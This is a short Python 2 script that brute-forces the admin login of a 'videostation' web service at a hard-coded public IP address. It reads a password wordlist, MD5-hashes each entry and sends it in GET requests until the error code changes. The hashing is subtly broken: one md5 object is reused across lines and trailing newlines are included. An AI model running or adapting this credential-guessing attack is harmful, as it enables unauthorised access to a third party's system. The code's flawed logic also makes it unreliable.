import httplib,urllib
import json
import hashlib
m = hashlib.md5()
file = open("password.txt")
i = 0;
while 1:
    i+=1
    lines = file.readlines(100000)
    if not lines:
        break
    for line in lines:
    	m.update(str(line))
    	psw = m.hexdigest()
    	url = "/videostation/admin/login?username=admin&password="+str(psw)
    	httpClient=None
    	httpClient=httplib.HTTPConnection('114.215.150.59',80,timeout=30)
    	headers={'Accept':'application/json'}
    	httpClient.request(method='GET',url=url,headers=headers)
    	response=httpClient.getresponse()
    	data=json.load(response,encoding='utf-8')
    	if data['errno']!=5002:
    		print "PWD:"+line
    		exit()
    	else:
    		print str(i)+"ERROR:"+line
    		print data